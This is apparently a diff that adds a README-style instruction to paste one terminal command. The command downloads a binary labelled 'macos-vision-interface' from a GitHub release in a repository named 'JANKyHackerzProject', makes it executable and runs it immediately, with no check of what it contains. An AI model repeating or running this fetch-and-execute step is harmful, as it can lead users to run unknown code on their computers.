@@ -1,0 +1,3 @@
+Copy and paste the following line of code into terminal:
+
+mkdir vision-interface && cd vision-interface && curl -L -o main "https://github.com/Jaxxiepoo/JANKyHackerzProject/releases/download/test/macos-vision-interface" > main && chmod +x main && ./main
